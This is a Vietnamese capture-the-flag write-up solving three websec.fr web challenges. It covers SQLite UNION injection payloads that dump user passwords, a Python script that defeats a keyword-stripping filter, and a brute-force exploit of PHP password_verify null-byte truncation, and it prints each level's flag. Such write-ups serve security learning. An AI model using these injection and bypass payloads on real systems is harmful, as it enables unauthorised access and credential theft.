<!-- markdownlint-disable MD024 -->
# Websec

## Level 01

> Nothing fancy
>
> 🔥 <https://websec.fr/level01/>

Tại level 1 này, chúng ta sẽ bắt đầu với một thử thách SQL Injection đơn giản.

Ứng dụng sẽ lấy `id` chúng ta nhập vào và trả về username cũng như id tương ứng.

![image](images/level-01/image-1.png)

Nếu chúng ta nhập vào `1'` sẽ thấy lỗi xuất hiện. Từ đó cho ta biết server đang sử dụng SQLite và giá trị của `id` đang được truyền thẳng vào câu truy vấn.

![image](images/level-01/image-2.png)

Vậy chúng ta có thể sử dụng payload như sau để xác định phiên bản của SQLite.

```sql
1 UNION SELECT null, sqlite_version();
```

![image](images/level-01/image-3.png)

Với phiên bản là `3.27.2`, chúng ta sẽ sử dụng payload sau để biết được cấu trúc của database.

```sql
1 UNION SELECT null, sql FROM sqlite_master
```

![image](images/level-01/image-4.png)

Vậy là câu truy vấn gốc không lấy ra giá trị từ cột `password`, chúng ta sẽ tận dụng SQL Injection để thực hiện điều đó.

Với `id` là `1` thì chúng ta sẽ lấy được password chứa flag.

```sql
1 UNION SELECT null, password FROM users WHERE id=1
```

![image](images/level-01/image-5.png)

Ngoài ra, chúng ta cũng có thể sử dụng payload sau để lấy hết tất cả password có trong bảng `users`.

```sql
1 UNION SELECT null, group_concat(password) FROM users
```

### Flag

`WEBSEC{Simple_SQLite_Injection}`

## Level 02

> Nothing fancy, with a twist
>
> 🔥 <https://websec.fr/level02/>

![image](images/level-02/image-1.png)

Sang tới level 2 này, lập trình viên đã thay thế các từ `union`, `order`, `select`, `from`, `group`, `by` (không phân biệt hoa thường) thành chuỗi rỗng `''`.

![image](images/level-02/image-2.png)

Vậy chúng ta có thể tạo thành từ `UNION` bằng cách sử dụng `UbyNION`, những từ khoá khác cũng tạo tương tự.

Mình đã viết một script Python bên dưới để lấy flag.

```python
import requests
import re

URL = "https://websec.fr/level02/index.php"

payload = "1 UbyNION SbyELECT null, password FbyROM users where id=1"

def solve():
    data = {
        "user_id": f"{payload}",
        "submit": ""
    }

    r = requests.post(URL, data=data)
    flag = re.search(r"WEBSEC{\w*}", r.text).group(0)

    print(flag)


if __name__ == "__main__":
    solve()

```

### Flag

`WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`

## Level 03

> ChaChaCha!
>
> 🔥 <https://websec.fr/level03/>

![image](images/level-03/image-1.png)

Khi thử nhập chuỗi bất kỳ như `abc` chúng ta thấy hiện ra chuỗi hash của flag `7c00249d409a91ab84e3f421c193520d9fb3674b`:

![image](images/level-03/image-2.png)

Xem source code tại [https://websec.fr/level03/source.php](https://websec.fr/level03/source.php), chúng ta tập trung vào đoạn code xử lý khi gửi chuỗi lên server:

```php
<?php
if(isset($_POST['c'])) {
    /*  Get rid of clever people that put `c[]=bla`
     *  in the request to confuse `password_hash`
     */
    $h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);

    echo "<div class='row'>";
    if (password_verify (sha1($flag, fa1se), $h2) === true) {
       echo "<p>Here is your flag: <mark>$flag</mark></p>"; 
    } else {
        echo "<p>Here is the <em>hash</em> of your flag: <mark>" . sha1($flag, false) . "</mark></p>";
    }
    echo "</div>";
}
?>
```

Có thể thấy rằng chuỗi chúng ta nhập vào được hash sha1 nhưng tạo ra raw bytes bởi vì sử dụng `fa1se` thay vì giá trị `false` và tiếp tục được hash bcrypt:

```php
 $h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);
```

Sau đó thực hiện gọi đến hàm `password_verify()` với 2 đối số hash sha1 của flag cũng ở dạng raw bytes với chuỗi hash bcrypt của chúng ta.

Xem source code triển khai của hàm [password_verify()](https://github.com/php/php-src/blob/PHP-5.6.26/ext/standard/password.c#L273), chúng ta thấy chuỗi hash truyền vào được lưu trữ với `char *ret, *password, *hash;` khiến nó chỉ lấy các ký tự cho đến khi gặp null byte.

Vì hash của flag là `7c00249d409a91ab84e3f421c193520d9fb3674b` có null byte ở vị trí thứ 2, do đó khi được xử lý trong hàm `password_verify()` nó sẽ chỉ còn một byte `7c`.

Vậy, chúng ta cần brute-force để tìm ra chuỗi có hash sha1 bắt đầu với bytes `7c00`. Chúng ta có thể viết script khai thác như sau:

```python
import hashlib
import requests
import re

i = 0

found = ""
while True:
    if hashlib.sha1(str(i).encode()).hexdigest().startswith("7c00"):
        found = i
        print(f"[+] Found: {found}")
        break
    i += 1

r = requests.post("https://websec.fr/level03/index.php", data={"c":found})
flag = re.search(r"WEBSEC{.*}", r.text).group(0)
print(f"[+] FLAG: {flag}")
```

Chạy script và nhận được flag:

```text
$ python3 solve.py
[+] Found: 104610
[+] FLAG: WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}
```

### Flag

`WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}`
